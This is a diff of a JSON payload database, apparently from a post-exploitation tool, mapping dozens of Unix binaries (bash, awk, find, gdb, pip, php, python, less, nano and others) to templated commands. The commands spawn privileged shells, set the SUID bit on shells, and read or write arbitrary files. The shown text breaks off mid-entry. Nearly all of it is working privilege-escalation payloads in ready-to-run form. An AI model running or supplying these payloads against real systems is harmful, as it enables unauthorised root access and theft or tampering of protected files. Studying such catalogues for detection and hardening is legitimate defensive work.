@@ -1,1 +1,3092 @@
-{"dd":[{"type":"read","payload":"{command} 2>/dev/null","args":["if={lfile}"],"suid":[],"input":"","stream":"raw","exit":"{ctrl_c}"},{"type":"write","stream":"raw","payload":"{command} 2>/dev/null","args":["of={lfile}","iflag=fullblock","bs=1","count={length}"]},{"type":"write","stream":"print","payload":"{command} 2>/dev/null","args":["of={lfile}"],"exit":"{ctrl_d}{ctrl_d}"}],"cp":[{"type":"write","stream":"print","payload":"TF=none; {command}; TF=$({mktemp}); {chmod} ugo+r $TF; {cat} > $TF; {command}; rm -f $TF","args":["$TF","{lfile}"],"exit":"{ctrl_d}"},{"type":"write","stream":"base64","payload":"TF=none; {command}; TF=$({mktemp}); {chmod} ugo+r $TF; {base64} -d > $TF; {command}; rm -f $TF","args":["$TF","{lfile}"],"exit":"{ctrl_d}"}],"bash":[{"type":"shell","stream":"print","suid":["-p"],"exit":"exit"},{"type":"read","stream":"raw","payload":"{command}","args":["-c","'{cat} {lfile}'"],"suid":["-p"]},{"type":"write","stream":"base64","payload":"{command}","args":["-c","'{base64} -d > {lfile}'"],"suid":["-p"],"exit":"{ctrl_d}{ctrl_d}"}],"dash":[{"type":"shell","stream":"print","suid":["-p"],"exit":"exit"},{"type":"read","stream":"raw","payload":"{command} -c '{cat} {lfile}'","suid":["-p"],"exit":"{ctrl_d}"},{"type":"write","stream":"base64","payload":"{command} -c '{base64} -d > {lfile}'","suid":["-p"],"exit":"{ctrl_d}"}],"cat":[{"type":"read","stream":"raw","payload":"{command} {lfile}"}],"apt":[{"type":"shell","args":["changelog","apt"],"input":"!{shell}\n","exit":"exit\nq\n"}],"apt-get":[{"type":"shell","args":["changelog","apt"],"input":"!{shell}\n","exit":"exit\nq\n"}],"aria2c":[{"type":"shell","payload":"export TF=$({mktemp}); export SH=$({mktemp}); {cp} {shell} $SH; echo \"{chown} root:root $SH; {chmod} +sx $SH\" > $TF; {chmod} +x $TF; {command}; sleep 1; {rm} -f $TF; $SH -p","input":"rm -f $TF; rm -f $SH; unset TF; unset SH;\n","args":["--on-download-error=$TF","http://x"],"exit":"exit"}],"ash":[{"type":"shell","stream":"print","suid":["-p"],"exit":"exit"},{"type":"read","stream":"print","payload":"{command} -c '{cat} {lfile}'","suid":["-p"],"exit":"{ctrl_c}"},{"type":"write","stream":"base64","payload":"{command} -c '{base64} -d > {lfile}'","suid":["-p"],"exit":"{ctrl_c}"}],"awk":[{"type":"shell","payload":"{command} 'BEGIN {{system(\"{shell} -p\")}}'","exit":"exit"},{"type":"read","stream":"print","payload":"{command} // {lfile}"},{"type":"read","stream":"raw","payload":"{command} 'BEGIN {{system(\"{cat} {lfile}\")}}'"},{"type":"write","stream":"print","args":["-v","LFILE={lfile}","'BEGIN {{ printf \"\" > LFILE; while ((getline) > 0){{ print >> LFILE }} }}'"],"exit":"{ctrl_d}"}],"base32":[{"type":"read","stream":"raw","payload":"{command} {lfile} | {base32} -d","args":[]}],"base64":[{"type":"read","stream":"raw","payload":"{command} {lfile} | {base64} -d","args":[]}],"bpftrace":[{"type":"shell","args":["-c","'{shell} -p'","-e","'END {{exit()}}'"],"suid":["-p"],"exit":"exit"}],"busctl":[{"type":"shell","input":"!{shell}\n","exit":"exit\nq\n"}],"byebug":[{"type":"shell","payload":"TF=$({mktemp}); echo 'system(\"{shell}\")' > $TF; {command}; rm -f $TF","args":["--no-stop","-q","$TF"],"exit":"exit\n"},{"type":"read","payload":"TF=$({mktemp}); echo 'system(\"{cat} {lfile}\")' > $TF; {command}; rm -f $TF","args":["--no-stop","-q","$TF"],"exit":"exit\n"}],"chmod":[{"type":"shell","payload":"{command}","args":["+s","{shell}; {shell} -p"],"exit":"exit\n"},{"type":"read","payload":"{command} 2>/dev/null","args":["+s","{dd};","{dd}","if={lfile}"],"stream":"raw"},{"type":"write","stream":"raw","payload":"{command} 2>/dev/null","args":["+s","{dd};","{dd}","of={lfile}","iflag=count_bytes,fullblock","count={length}"]},{"type":"write","stream":"print","payload":"{command} 2>/dev/null","args":["+s","{dd};","{dd}","of={lfile}"],"exit":"{ctrl_d}"}],"chroot":[{"type":"shell","payload":"{command}","args":["/","{shell}","-p"],"exit":"exit\n"}],"cobc":[{"type":"shell","payload":"TF=none; {command} 2>/dev/null; TF=$({mktemp}); echo 'CALL \"SYSTEM\" USING \"exec {shell} -p\".' > $TF; {command} 2>&1; rm -f $TF","args":["-xFj","--frelax-syntax-checks","$TF"],"exit":"exit\n"}],"cpan":[{"type":"shell","payload":"{command}","input":"! system(\"{shell} -p\")\n","exit":"exit\nexit\n"}],"cpulimit":[{"type":"shell","payload":"{command}","args":["-l","100","-f","\"{shell}\""],"exit":"exit\n"}],"crash":[{"type":"shell","payload":"{command}","args":["-h"],"input":"!{shell} -p\n","exit":"exit\nq\n"}],"csh":[{"type":"shell","payload":"{command}","suid":["-b"],"input":"{shell} -p\n","exit":"exit\nexit\n"},{"type":"read","stream":"print","payload":"{command}","args":["-c","\"{cat} {lfile}\"","-b"]},{"type":"write","stream":"base64","payload":"{command}","args":["-c","\"{base64} -d > {lfile}\"","-b"],"exit":"{ctrl_d}{ctrl_d}"}],"bsd-csh":[{"type":"shell","payload":"{command}","input":"{shell} -p\n","suid":["-b"],"exit":"exit\nexit\n"},{"type":"read","stream":"print","payload":"{command}","args":["-c","\"{cat} {lfile}\"","-b"]},{"type":"write","stream":"base64","payload":"{command}","args":["-c","\"{base64} -d > {lfile}\"","-b"],"exit":"{ctrl_d}{ctrl_d}"}],"curl":[{"type":"read","stream":"raw","payload":"{command}","args":["-s","file://{lfile} --output -"]},{"type":"read","stream":"base64","payload":"{command} | {base64} -w 0","args":["-s","file://{lfile} --output -"]},{"type":"write","stream":"print","payload":"TF=none; {command}; TF=$({mktemp}); {chmod} ugo+r $TF; {cat} > $TF; {command}; rm -f $TF","args":["-s","file://$TF --output {lfile}"],"exit":"{ctrl_d}"},{"type":"write","stream":"base64","payload":"TF=none; {command}; TF=$({mktemp}); {chmod} ugo+r $TF; {base64} -d > $TF; {command}; rm -f $TF","args":["-s","file://$TF","--output","{lfile}"],"exit":"{ctrl_d}"}],"cut":[{"type":"read","stream":"print","payload":"{command}","args":["-d","''","-f1","{lfile}"]}],"date":[{"type":"read","stream":"print","payload":"{command} | {cut} -d \":\" -f2- | while read line; do echo ${{line:14:-1}}; done","args":["-f","{lfile}","+\"%M%M%M%M%M%M\"","2>&1"]}],"diff":[{"type":"read","stream":"print","payload":"{command}","args":["--line-format=%L","/dev/null","{lfile}"]}],"dmesg":[{"type":"shell","payload":"{command}","args":["-H"],"input":"!{shell} -p\n","exit":"exit\nq\n"},{"type":"read","stream":"print","payload":"{command}","args":["-rF","{lfile}"]}],"dpkg":[{"type":"shell","payload":"{command}","args":["-l"],"input":"!{shell} -p\n","exit":"exit\nq\n"}],"easy_install":[{"type":"shell","payload":"TF=none; {command} -h; TF=$({mktemp} -d);echo \"import os; os.execl('{shell}', '{shell}', '-c', '{shell} -p <$({tty}) >$({tty}) 2>$({tty})')\" > $TF/setup.py; {command} $TF","args":[],"exit":"exit\n"},{"type":"read","stream":"raw","payload":"TF=none; {command} -h 2>/dev/null 1>&2; TF=$({mktemp} -d);echo \"import sys; sys.stdout.buffer.write(open('{lfile}', 'rb').read())\" > $TF/setup.py; {command} $TF 2>/dev/null | {tail} -n +4","args":[]},{"type":"write","stream":"base64","payload":"TF=none; {command} -h 2>/dev/null 1>&2; TF=$({mktemp} -d); {cat} > $TF/b64; echo \"import os; os.execl('''{python}''', 'python', '''-c''', '''import base64\\nwith open('{lfile}','wb') as h:\\n\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\th.write(base64.b64decode(line.strip()))''')\" > $TF/setup.py; {command} $TF 2>/dev/null; {rm} -f $TF/b64","args":[],"exit":"{ctrl_d}{ctrl_d}"}],"eb":[{"type":"shell","payload":"{command}","args":["logs"],"input":"!{shell} -p\n","exit":"exit\nq\n"}],"ed":[{"type":"shell","payload":"{command}","input":"!{shell} -p\n","exit":"exit\nq\n"},{"type":"read","stream":"raw","payload":"echo ',p' | {command}","args":["-s","{lfile}"],"input":",p\n","exit":"q\n"},{"type":"write","stream":"print","payload":"echo -e \"1,\\$d\\na\\n$({cat})\\n.\\nw\\nq\\n\" | {command}","args":["-s","{lfile}"],"exit":"{ctrl_d}"}],"emacs":[{"type":"shell","payload":"{command}; {shell} -p","args":["-Q","-nw","--eval '(chmod \"{shell}\" #o4755)'","--eval \"(kill-emacs)\""],"exit":"exit\n"},{"type":"read","stream":"raw","payload":"TF=$({mktemp}); {command}; {cat} $TF ","args":["-Q","-nw","{lfile}","--eval \"(write-file \\\"$TF\\\")\"","--eval '(kill-emacs)'"]},{"type":"write","stream":"print","payload":"{cat} > /tmp/.em; {command}","args":["-Q","-nw","/tmp/.em","--eval \"(write-file \\\"{lfile}\\\")\"","--eval '(kill-emacs)'"],"exit":"{ctrl_d}{ctrl_d}"}],"env":[{"type":"shell","payload":"{command} {shell} -p","args":[],"exit":"exit\n"}],"eqn":[{"type":"read","stream":"print","payload":"TF={lfile}; {command} | {grep} -Pzo \"(?s)\\.lf 1 $TF.*\" | {tail} -n +2","args":["$TF"]}],"expand":[{"type":"read","stream":"print","payload":"{command}","args":["{lfile}"]}],"expect":[{"type":"shell","payload":"{command}","args":["-c","\"spawn {shell} -p; interact\""],"exit":"exit\n"},{"type":"read","stream":"raw","payload":"{command}","args":["-c","\"spawn {cat} {lfile}; interact\""]}],"facter":[{"type":"shell","payload":"TF=$({mktemp} -d); echo 'exec(\"{shell} -p\")' > $TF/x.rb; FACTERLIB=$TF {command}","args":[""]}],"find":[{"type":"shell","payload":"{command}","args":[".","-exec","{shell} -p","\\;","-quit"]},{"type":"read","stream":"raw","payload":"{command}","args":[".","-exec","{cat} {lfile}","\\;","-quit"]}],"flock":[{"type":"shell","payload":"{command}","args":["-u","/","{shell} -p"]},{"type":"read","stream":"raw","payload":"{command}","args":["-u","/","{cat} {lfile}"]},{"type":"write","stream":"base64","payload":"{command}","args":["-u","/","{sh} -c \"{base64} -d > {lfile}\""],"exit":"{ctrl_d}{ctrl_d}"}],"fmt":[{"type":"read","stream":"raw","payload":"{command}","args":["-pNON_EXISTING_PREFIX","{lfile}"]}],"fold":[{"type":"read","stream":"raw","payload":"{command}","args":["-w99999999","{lfile}"]}],"ftp":[{"type":"shell","payload":"{command}","input":"!{shell} -p\n","exit":"exit\nexit\n"}],"gawk":[{"type":"shell","payload":"{command} 'BEGIN {{system(\"{shell} -p\")}}'","exit":"exit"},{"type":"read","stream":"print","payload":"{command} // {lfile}"},{"type":"read","stream":"raw","payload":"{command} 'BEGIN {{system(\"{cat} {lfile}\")}}'"},{"type":"write","stream":"print","args":["-v","LFILE={lfile}","'BEGIN {{ printf \"\" > LFILE; while (getline > 0){{ print >> LFILE; }} }}'"],"exit":"{ctrl_d}"}],"gcc":[{"type":"shell","payload":"{command}","args":["-wrapper","{shell},-p,-s","."]}],"gdb":[{"type":"shell","payload":"{command}","args":["-q","-nx","-ex","'!{shell} -p'","-ex","quit"]},{"type":"shell","payload":"{command}","args":["-q","-nx","-ex","'python import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'","-ex","quit"]},{"type":"read","stream":"print","payload":"{command}","args":["-q","-nx","-ex","'set height 0'","-ex","'python print(open(\"{lfile}\").read())'","-ex","quit"]},{"type":"write","stream":"print","payload":"{command}","args":["-q","-nx","-ex","'python import sys; open(\"{lfile}\",\"w\").write(sys.stdin.read())'","-ex","quit"],"exit":"{ctrl_d}{ctrl_d}"},{"type":"write","stream":"base64","payload":"{command}","args":["-q","-nx","-ex","'python import sys,base64; exec(\"\"\"with open(\"{lfile}\",\"wb\") as f:\\n\\tfor line in sys.stdin:\\n\\t\\tf.write(base64.b64decode(line.strip()))\"\"\")'","-ex","quit"],"exit":"{ctrl_d}{ctrl_d}"}],"gem":[{"type":"shell","payload":"{command}","args":["open","-e","'{shell} -c {shell} -p'","rdoc"]},{"type":"read","stream":"raw","payload":"{command}","args":["open","-e","'{cat} {lfile}'","rdoc"]}],"genisoimage":[{"type":"read","stream":"print","payload":"{command} -q -o - {lfile} | {tail} -c +49152","args":[]}],"gimp-2.8":[{"type":"shell","payload":"{command}","args":["-idf","--batch-interpreter=python-fu-eval","-b","'import os, pty;exec(\"try:\\n\\tos.setuid(0);\\nexcept:\\n\\tpass\\ntry:\\n\\tos.setgid(0)\\nexcept:\\n\\tpass\"); pty.spawn(\"{shell}\");gimp.exit()'"],"exit":"exit"},{"type":"read","stream":"raw","payload":"{command} 2>/dev/null","args":["-idf","--batch-interpreter=python-fu-eval","-b","'import sys; sys.stdout.write(open(\"{lfile}\",\"rb\").read());gimp.exit()'"]}],"gimp":[{"type":"shell","payload":"{command}","args":["-idf","--batch-interpreter=python-fu-eval","-b","'import os; os.system(\"{shell} -p\");gimp.exit()'"],"exit":"exit"},{"type":"read","stream":"raw","payload":"{command} 2>/dev/null","args":["-idf","--batch-interpreter=python-fu-eval","-b","'import sys; sys.stdout.write(open(\"{lfile}\",\"rb\").read());gimp.exit()'"]}],"git":[{"type":"shell","payload":"{command}","args":["help","config"],"input":"!{shell}\n","exit":"exit\nq\n"}],"grep":[{"type":"read","stream":"print","payload":"{command}","args":["''","{lfile}"]}],"gtester":[{"type":"shell","payload":"TF=$({mktemp}); echo '#!{shell} -p' > $TF; echo 'exec {shell} -p 0<&1' >> $TF; {chmod} +x $TF; {command}; rm -f $TF","args":["-q","$TF"]}],"head":[{"type":"read","stream":"raw","payload":"{command}","args":["-c1GB","{lfile}"]}],"highlight":[{"type":"read","stream":"print","payload":"{command}","args":["--no-doc","--failsafe","{lfile}"]}],"iconv":[{"type":"read","stream":"raw","payload":"{command}","args":["-f","8859_1","-t","8859_1","{lfile}"]},{"type":"write","stream":"base64","payload":"{base64} -d | {command}","args":["-f","8859_1","-t","8859_1","-o","{lfile}"]}],"ionice":[{"type":"shell","payload":"{command}","args":["{shell}","-p"]}],"ip":[{"type":"shell","payload":"{command} netns add foo; {command} netns exec foo {shell} -p && {command} netns delete foo","args":[],"exit":"exit\n{ip} netns delete foo\n"}],"irb":[{"type":"shell","payload":"TF=$({mktemp}); echo 'exec \"{shell} -p\"' > $TF; {command}","args":["$TF"]},{"type":"read","stream":"print","payload":"TF=$({mktemp}); echo 'puts File.read(\"{lfile}\")' > $TF; {command} | {head} -n -2 | {tail} -n +2 | {head} -c -1","args":["$TF"]},{"type":"write","stream":"print","payload":"TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {command}","args":["$TF"],"exit":"{ctrl_d}{ctrl_d}"},{"type":"write","stream":"base64","payload":"TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {base64} -d | {command}","args":["$TF"],"exit":"{ctrl_d}{ctrl_d}"}],"irb2.5":[{"type":"shell","payload":"TF=$({mktemp}); echo 'exec \"{shell} -p\"' > $TF; {command}","args":["$TF"]},{"type":"read","stream":"print","payload":"TF=$({mktemp}); echo 'puts File.read(\"{lfile}\")' > $TF; {command} | {head} -n -2 | {tail} -n +2 | {head} -c -1","args":["$TF"]},{"type":"write","stream":"print","payload":"TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {command}","args":["$TF"],"exit":"{ctrl_d}{ctrl_d}"},{"type":"write","stream":"base64","payload":"TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {base64} -d | {command}","args":["$TF"],"exit":"{ctrl_d}{ctrl_d}"}],"jjs":[{"type":"shell","payload":"echo \"Java.type('java.lang.Runtime').getRuntime().exec('{shell} -pc \\$@|sh\\${{IFS}}-p _ echo {shell} -p <$({tty}) >$({tty}) 2>$({tty})').waitFor()\" | {command}","args":[""]}],"journalctl":[{"type":"shell","payload":"{command}","input":"!{shell} -p\n","exit":"exit\n{ctrl_c}"}],"jq":[{"type":"read","stream":"print","payload":"{command}","args":["-Rr",".","{lfile}"]}],"jrunscript":[{"type":"shell","payload":"{command}","args":["-e","\"exec('/bin/sh -pc \\$@|sh\\${{IFS}}-p _ echo /bin/bash -p <$({tty}) >$({tty}) 2>$({tty})')\""]}],"ksh":[{"type":"shell","payload":"{command}","suid":["-p"],"input":"{shell} -p\n","exit":"exit\nexit\n"},{"type":"read","stream":"print","payload":"{command}","args":["-c","\"{cat} {lfile}\""]},{"type":"write","stream":"base64","payload":"{command}","args":["-c","\"{base64} -d > {lfile}\""],"exit":"{ctrl_d}{ctrl_d}"}],"ksh93":[{"type":"shell","payload":"{command}","suid":["-p"],"input":"{shell} -p\n","exit":"exit\nexit\n"},{"type":"read","stream":"print","payload":"{command}","args":["-c","\"{cat} {lfile}\""]},{"type":"write","stream":"base64","payload":"{command}","args":["-c","\"{base64} -d > {lfile}\""],"exit":"{ctrl_d}{ctrl_d}"}],"ld-linux-x86-64.so.2":[{"type":"shell","payload":"{command}","args":["{shell}","-p"]}],"ld-linux-x86-64.so.1":[{"type":"shell","payload":"{command}","args":["{shell}","-p"]}],"ld-linux-x86.so.2":[{"type":"shell","payload":"{command}","args":["{shell}","-p"]}],"ld-linux-x86.so.1":[{"type":"shell","payload":"{command}","args":["{shell}","-p"]}],"ld-linux.so.1":[{"type":"shell","payload":"{command}","args":["{shell}","-p"]}],"ld-linux.so.2":[{"type":"shell","payload":"{command}","args":["{shell}","-p"]}],"ld.so.2":[{"type":"shell","payload":"{command}","args":["{shell}","-p"]}],"ld.so.1":[{"type":"shell","payload":"{command}","args":["{shell}","-p"]}],"ld.so":[{"type":"shell","payload":"{command}","args":["{shell}","-p"]}],"ld-2.so":[{"type":"shell","payload":"{command}","args":["{shell}","-p"]}],"ld-2.30.so":[{"type":"shell","payload":"{command}","args":["{shell}","-p"]}],"less":[{"type":"shell","payload":"{command} /etc/profile","input":"!{shell} -p\n\n","exit":"exit\nq"},{"type":"read","stream":"raw","payload":"{command} | {cat}","args":["{lfile}"]},{"type":"write","stream":"base64","payload":"{command} /etc/hosts; TF=$({mktemp} -u); {base64} -d > $TF; {command} < $TF; {rm} -f $TF","input":"q","exit":"{ctrl_d}{ctrl_d}s{lfile}\nq\n"}],"logsave":[{"type":"shell","payload":"{command}","args":["/dev/null","{shell}","-i","-p","-c","\"exec {shell} -p <$({tty}) >$({tty}) 2>$({tty})\""]}],"look":[{"type":"read","stream":"print","payload":"{command}","args":["''","{lfile}"]},{"type":"read","stream":"raw","payload":"{command} | {head} -c -1","args":["''","{lfile}"]}],"ltrace":[{"type":"shell","payload":"{command}","args":["-b","-L","{shell} -p"]}],"lwp-request":[{"type":"read","stream":"raw","payload":"{command}","args":["file://{lfile}"]}],"mail":[{"type":"shell","payload":"{command}","args":["--exec='!{shell}'"]}],"make":[{"type":"shell","payload":"{command}","args":["-s","--eval=$'x:\\n\\t-'\"{shell} -p\""]}],"man":[{"type":"shell","payload":"{command}","args":["man"],"input":"!{shell}\n","exit":"exit\nq"}],"mawk":[{"type":"shell","payload":"{command} 'BEGIN {{system(\"{shell} -p\")}}'"},{"type":"read","stream":"print","payload":"{command} // {lfile}"},{"type":"read","stream":"raw","payload":"{command} 'BEGIN {{system(\"{cat} {lfile}\")}}'"}],"more":[{"type":"shell","payload":"TERM= {command} /etc/passwd","input":"!{shell}","exit":"exit\nq"},{"type":"read","stream":"print","payload":"{command} {lfile} | {cat}"}],"mtr":[{"type":"read","stream":"print","payload":"{command} | | while read line; do echo ${line:28:-27}; done","args":["--raw","-F","{lfile}"]}],"mv":[{"type":"write","stream":"base64","payload":"TF=$({mktemp} -u); {base64} -d > $TF; {command}; {rm} -f $TF","args":["$TF","{lfile}"]}],"nano":[{"type":"shell","payload":"{command}","input":"{ctrl_r}{ctrl_x}reset; {shell} -p 1>&0 2>&0\n","exit":"exit\n{ctrl_x}n"},{"type":"shell","payload":"{command}","args":["-s","'{shell} -p'"],"input":"{shell} -p\n{ctrl_t}","exit":"exit\n{ctrl_x}n"},{"type":"shell","payload":"SPELL='{shell} -p' {command}","args":[],"input":"{shell} -p\n{ctrl_t}","exit":"exit\n{ctrl_x}n"}],"nawk":[{"type":"shell","payload":"{command} 'BEGIN {{system(\"{shell} -p\")}}'"},{"type":"read","stream":"print","payload":"{command} // {lfile}"},{"type":"read","stream":"raw","payload":"{command} 'BEGIN {{system(\"{cat} {lfile}\")}}'"}],"nice":[{"type":"shell","payload":"{command}","args":["{shell} -p"]}],"nl":[{"type":"read","stream":"print","payload":"{command} | while read line; do echo $line; done","args":["-bn","-w1","-s","''","{lfile}"]}],"nmap":[{"type":"shell","payload":"TF=$({mktemp}); echo 'os.execute(\"{shell} -p\")' > $TF; {command}; {rm} -f $TF","input":"reset\n","args":["--script=$TF"]}],"node":[{"type":"shell","payload":"{command}","args":["-e","'require(\"child_process\").spawn(\"{shell}\", [\"-p\"], {{stdio: [0, 1, 2]}});'"]}],"nohup":[{"type":"shell","payload":"{command}","args":["{shell}","-p","-c","\"{shell} -p  <$({tty}) >$({tty}) 2>$({tty})\""]}],"nroff":[{"type":"shell","payload":"TF=$({mktemp} -d); echo '#!{shell} -p' > $TF/groff; echo '{shell} -p' >> $TF/groff; chmod +x $TF/groff; GROFF_BIN_PATH=$TF {command}","args":[]}],"nsenter":[{"type":"shell","payload":"{command}","args":["{shell} -p"]}],"od":[{"type":"read","stream":"print","payload":"echo -e $({command} -An -c -w9999 {lfile} | {sed} \"s/   /\\n/g\" | {tr} -d \"\\n\") | {head} -n -1","args":[""]}],"openssl":[{"type":"read","stream":"raw","payload":"{command}","args":["enc","-in","{lfile}"]},{"type":"write","stream":"base64","payload":"{base64} -d | {command}","args":["enc","-out","{lfile}"]}],"pdb":[{"type":"shell","payload":"TF=$({mktemp} -u); echo 'import os; os.system(\"{shell} -p\"); exit(0)' > $TF; {command}; {rm} -f $TF","args":["$TF"],"input":"cont\n"}],"perl":[{"type":"shell","payload":"{command}","args":["-e","'exec \"{shell} -p\"'"]}],"pg":[{"type":"shell","payload":"{command} /etc/profile","input":"!{shell} -p\n\n","exit":"exit\nq"},{"type":"read","stream":"raw","payload":"{command} | {cat}","args":["{lfile}"]}],"pager":[{"type":"shell","payload":"{command} /etc/profile","input":"!{shell} -p\n\n","exit":"exit\nq"},{"type":"read","stream":"raw","payload":"{command} | {cat}","args":["{lfile}"]}],"php":[{"type":"shell","payload":"{command}","args":["-r","'system(\"{shell} -p 1>&0 2>&0\");'"]},{"type":"shell","payload":"{command}","args":["-r","'passthru(\"{shell} -p 1>&0 2>&0\");'"]},{"type":"shell","payload":"{command}","args":["-r","'shell_exec(\"{shell} -p 1>&0 2>&0\");'"]},{"type":"shell","payload":"{command}","args":["-r","'$h=@popen(\"{shell} -p 1>&0 2>&0\",\"r\"); if($h){{ while(!feof($h)) echo(fread($h,4096)); pclose($h); }}'"]},{"type":"read","stream":"raw","payload":"{command}","args":["-r","'echo(file_get_contents(\"{lfile}\"));'"]}],"php5":[{"type":"shell","payload":"{command}","args":["-r","'system(\"{shell} -p 1>&0 2>&0\");'"]},{"type":"shell","payload":"{command}","args":["-r","'passthru(\"{shell} -p 1>&0 2>&0\");'"]},{"type":"shell","payload":"{command}","args":["-r","'shell_exec(\"{shell} -p 1>&0 2>&0\");'"]},{"type":"shell","payload":"{command}","args":["-r","'$h=@popen(\"{shell} -p 1>&0 2>&0\",\"r\"); if($h){{ while(!feof($h)) echo(fread($h,4096)); pclose($h); }}'"]},{"type":"read","stream":"raw","payload":"{command}","args":["-r","'echo(file_get_contents(\"{lfile}\"));'"]}],"php7":[{"type":"shell","payload":"{command}","args":["-r","'system(\"{shell} -p 1>&0 2>&0\");'"]},{"type":"shell","payload":"{command}","args":["-r","'passthru(\"{shell} -p 1>&0 2>&0\");'"]},{"type":"shell","payload":"{command}","args":["-r","'shell_exec(\"{shell} -p 1>&0 2>&0\");'"]},{"type":"shell","payload":"{command}","args":["-r","'$h=@popen(\"{shell} -p 1>&0 2>&0\",\"r\"); if($h){{ while(!feof($h)) echo(fread($h,4096)); pclose($h); }}'"]},{"type":"read","stream":"raw","payload":"{command}","args":["-r","'echo(file_get_contents(\"{lfile}\"));'"]}],"php7.0":[{"type":"shell","payload":"{command}","args":["-r","'system(\"{shell} -p 1>&0 2>&0\");'"]},{"type":"shell","payload":"{command}","args":["-r","'passthru(\"{shell} -p 1>&0 2>&0\");'"]},{"type":"shell","payload":"{command}","args":["-r","'shell_exec(\"{shell} -p 1>&0 2>&0\");'"]},{"type":"shell","payload":"{command}","args":["-r","'$h=@popen(\"{shell} -p 1>&0 2>&0\",\"r\"); if($h){{ while(!feof($h)) echo(fread($h,4096)); pclose($h); }}'"]},{"type":"read","stream":"raw","payload":"{command}","args":["-r","'echo(file_get_contents(\"{lfile}\"));'"]}],"php7.3":[{"type":"shell","payload":"{command}","args":["-r","'system(\"{shell} -p 1>&0 2>&0\");'"]},{"type":"shell","payload":"{command}","args":["-r","'passthru(\"{shell} -p 1>&0 2>&0\");'"]},{"type":"shell","payload":"{command}","args":["-r","'shell_exec(\"{shell} -p 1>&0 2>&0\");'"]},{"type":"shell","payload":"{command}","args":["-r","'$h=@popen(\"{shell} -p 1>&0 2>&0\",\"r\"); if($h){{ while(!feof($h)) echo(fread($h,4096)); pclose($h); }}'"]},{"type":"read","stream":"raw","payload":"{command}","args":["-r","'echo(file_get_contents(\"{lfile}\"));'"]}],"pic":[{"type":"shell","payload":"{command}","args":["-U"],"input":".PS\nsh X {shell} X\n","exit":"exit\n{ctrl_c}"}],"pico":[{"type":"shell","payload":"{command}","input":"{ctrl_r}{ctrl_x}reset; {shell} -p 1>&0 2>&0\n","exit":"exit\n{ctrl_x}n"},{"type":"shell","payload":"{command}","args":["-s","'{shell} -p'"],"input":"{shell} -p\n{ctrl_t}","exit":"exit\n{ctrl_x}n"},{"type":"shell","payload":"SPELL='{shell} -p' {command}","args":[],"input":"{shell} -p\n{ctrl_t}","exit":"exit\n{ctrl_x}n"}],"pip":[{"type":"shell","payload":"TF=$({mktemp} -d); echo \"import os; os.execl('{shell}', '{shell}', '-p', '-c', '{shell} -p <$({tty}) >$({tty}) 2>$({tty})')\" > $TF/setup.py; {command}","args":["install","$TF"]}],"pip3":[{"type":"shell","payload":"TF=$({mktemp} -d); echo \"import os; os.execl('{shell}', '{shell}', '-p', '-c', '{shell} -p <$({tty}) >$({tty}) 2>$({tty})')\" > $TF/setup.py; {command}","args":["install","$TF"]}],"pry":[{"type":"shell","payload":"{command}","args":["--exec","'system(\"{shell} -p\");exit'"]}],"python":[{"type":"shell","payload":"{command}","args":["-c","'import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'"]},{"type":"read","stream":"raw","payload":"{command}","args":["-c","'import sys, os; sys.stdout.buffer.write(open(\"{lfile}\", \"rb\").read())'"]},{"type":"write","stream":"base64","payload":"TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\nwith open('{lfile}','wb') as h:\\n\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\th.write(base64.b64decode(line.strip()))''')\"; {rm} -f $TF/b64","args":[""],"exit":"{ctrl_d}{ctrl_d}"}],"python3.8":[{"type":"shell","payload":"{command}","args":["-c","'import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'"]},{"type":"read","stream":"raw","payload":"{command}","args":["-c","'import sys, os; sys.stdout.buffer.write(open(\"{lfile}\", \"rb\").read())'"]},{"type":"write","stream":"base64","payload":"TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64","args":[""],"exit":"{ctrl_d}{ctrl_d}"}],"python3.7":[{"type":"shell","payload":"{command}","args":["-c","'import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'"]},{"type":"read","stream":"raw","payload":"{command}","args":["-c","'import sys, os; sys.stdout.buffer.write(open(\"{lfile}\", \"rb\").read())'"]},{"type":"write","stream":"base64","payload":"TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64","args":[""],"exit":"{ctrl_d}{ctrl_d}"}],"python3.5":[{"type":"shell","payload":"{command}","args":["-c","'import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'"]},{"type":"read","stream":"raw","payload":"{command}","args":["-c","'import sys, os; sys.stdout.buffer.write(open(\"{lfile}\", \"rb\").read())'"]},{"type":"write","stream":"base64","payload":"TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64","args":[""],"exit":"{ctrl_d}{ctrl_d}"}],"python3":[{"type":"shell","payload":"{command}","args":["-c","'import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'"]},{"type":"read","stream":"raw","payload":"{command}","args":["-c","'import sys, os; sys.stdout.buffer.write(open(\"{lfile}\", 